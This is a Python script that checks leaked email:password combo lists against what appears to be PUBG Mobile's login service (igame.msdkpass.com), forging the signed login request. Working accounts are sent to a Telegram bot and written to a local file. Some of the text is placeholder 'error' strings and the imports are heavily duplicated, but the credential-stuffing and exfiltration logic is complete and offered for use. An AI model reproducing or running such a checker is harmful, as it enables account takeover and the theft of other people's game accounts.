import requests,hashlib,random,string,time
r = requests.session()
from time import sleep
import webbrowser
import random
import uuid
import requests
import string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests
import os
import random
import json
import threading
import secrets,uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
from uuid import uuid4
Z = '\033[1;31m' #Te
X = '\033[1;33m' #ad
Z1 = '\033[2;31m' #sm
F = '\033[2;32m' #gr
A = '\033[2;34m'#bl
C = '\033[2;35m' #pe
B = '\033[2;36m'#fl
Y = '\033[1;34m' #gm
webbrowser.open('error')
webbrowser.open('error')
print('_'*60)
print('error')
print('errors')
print('_'*60)
print('\n\n\n')
ID = input('[+] error: ')
token = input('[+] error: ')
headPUB = {
	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}	
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""
success
_________________________
𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 𖡦 > {eml}
𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𖡦 > {pas}
_____________________
 error
_________________________"""
  NO = f"""
⛔️No ✅⭕️
____________________
user 𖡦 > {eml}
pass 𖡦 > {pas}
_________________
error 

━━━━━━━━━━━━━"""
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"token"' in GO:
    print(YES)
    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\n error')
    with open('NWE-PUBG.txt', 'a') as x:
      x.write(eml+':'+pas+' |error\n')
  else:
    print(NO)
def FILname():
  F = input('[+] combo list : ')
  try:
    for x in open(F,'r').read().splitlines():
      email = x.split(":")[0]
      pess = x.split(":")[1]
      CHECK(email,pess)
  except FileNotFoundError:
    print('\n[-] The file name is incorrec!!! \n')
    return FILname()
FILname()
